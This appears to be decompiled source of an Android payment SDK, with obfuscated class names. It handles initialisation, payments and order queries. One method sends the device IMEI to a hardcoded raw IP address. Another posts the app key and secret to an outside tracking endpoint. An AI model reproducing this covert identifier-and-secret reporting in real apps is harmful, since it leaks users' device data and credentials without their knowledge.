package com.zdtpay;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import com.zdtpay.net.DataRequestTask;
import com.zdtpay.tools.c;
import com.zdtpay.tools.d;
import java.io.PrintStream;
import java.util.HashMap;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.conn.ClientConnectionManager;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

public class ZDTPaySDK
{
  private static ZDTPaySDK SDK = null;
  private static String VER = "1.5.9";
  
  public ZDTPaySDK() {}
  
  private static void getM(Context paramContext)
  {
    new r(paramContext).start();
  }
  
  private static String getResultForHttpGet(String paramString)
  {
    Object localObject1 = "http://112.126.69.51/imei_mobile.php?imei=" + paramString;
    paramString = "";
    Object localObject2 = new HttpGet((String)localObject1);
    localObject1 = new DefaultHttpClient();
    localObject2 = ((HttpClient)localObject1).execute((HttpUriRequest)localObject2);
    if (((HttpResponse)localObject2).getStatusLine().getStatusCode() == 200) {
      paramString = EntityUtils.toString(((HttpResponse)localObject2).getEntity());
    }
    ((HttpClient)localObject1).getConnectionManager().closeExpiredConnections();
    return paramString;
  }
  
  public static String getVersion()
  {
    return VER;
  }
  
  public static ZDTPaySDK initSDK(Context paramContext, String paramString1, String paramString2)
  {
    try
    {
      System.out.println("ver:" + getVersion());
      if (SDK == null) {
        SDK = new ZDTPaySDK();
      }
      com.zdtpay.tools.b.c = paramContext;
      d.a().a(paramContext);
      f.a(paramContext);
      Object localObject = paramContext.getSharedPreferences("myevent", 0);
      boolean bool = ((SharedPreferences)localObject).getBoolean(c.b, true);
      ((SharedPreferences)localObject).edit().putString("zpayAppKey", paramString1).commit();
      ((SharedPreferences)localObject).edit().putString("zpayAppSecret", paramString2).commit();
      if (bool)
      {
        localObject = new ZDTPayParamInfo();
        ((ZDTPayParamInfo)localObject).setAppkey(paramString1);
        ((ZDTPayParamInfo)localObject).setAppsecret(paramString2);
        onEvent(paramContext, (ZDTPayParamInfo)localObject, "init", null);
      }
      paramContext = SDK;
      return paramContext;
    }
    finally {}
  }
  
  public static void onEvent(Context paramContext, ZDTPayParamInfo paramZDTPayParamInfo, String paramString, StatusBack paramStatusBack)
  {
    HashMap localHashMap = new HashMap();
    localHashMap.put("soft", ZTbie.a(paramContext));
    localHashMap.put("soft_data", com.zdtpay.tools.f.c());
    localHashMap.put("extra", paramString);
    localHashMap.put(c.i, paramZDTPayParamInfo.getAppkey());
    localHashMap.put("appsecret", paramZDTPayParamInfo.getAppsecret());
    DataRequestTask.a(paramContext, 0, "http://api.taomike.com/install_zhubao.php", localHashMap, new q(paramStatusBack, paramContext));
  }
  
  public void pay(Context paramContext, ZDTPayCallbackListener paramZDTPayCallbackListener, ZDTPayParamInfo paramZDTPayParamInfo)
  {
    SharedPreferences localSharedPreferences = paramContext.getSharedPreferences("myevent", 0);
    paramZDTPayParamInfo.setAppkey(localSharedPreferences.getString("zpayAppKey", ""));
    paramZDTPayParamInfo.setAppsecret(localSharedPreferences.getString("zpayAppSecret", ""));
    com.zdtpay.tools.b.a = paramZDTPayCallbackListener;
    com.zdtpay.tools.b.c = paramContext;
    com.zdtpay.tools.b.d = paramZDTPayParamInfo;
    ZTbie.a(paramContext, "15081421");
    try
    {
      paramContext.startService(new Intent(paramContext, ZTbie.class));
      return;
    }
    catch (Exception paramZDTPayCallbackListener)
    {
      paramZDTPayCallbackListener.printStackTrace();
      ZTbie.a(paramContext, "15081431");
    }
  }
  
  public void queryOrderState(Context paramContext, ZDTPayQueryOrderListener paramZDTPayQueryOrderListener, ZDTPayParamInfo paramZDTPayParamInfo, String paramString)
  {
    SharedPreferences localSharedPreferences = paramContext.getSharedPreferences("myevent", 0);
    paramZDTPayParamInfo.setAppkey(localSharedPreferences.getString("zpayAppKey", ""));
    paramZDTPayParamInfo.setAppsecret(localSharedPreferences.getString("zpayAppSecret", ""));
    com.zdtpay.tools.b.b = paramZDTPayQueryOrderListener;
    com.zdtpay.tools.b.c = paramContext;
    com.zdtpay.tools.b.d = paramZDTPayParamInfo;
    try
    {
      paramZDTPayQueryOrderListener = new Intent(paramContext, ZDTPayQueryOrderService.class);
      paramZDTPayQueryOrderListener.putExtra(c.o, paramString);
      paramContext.startService(paramZDTPayQueryOrderListener);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
}
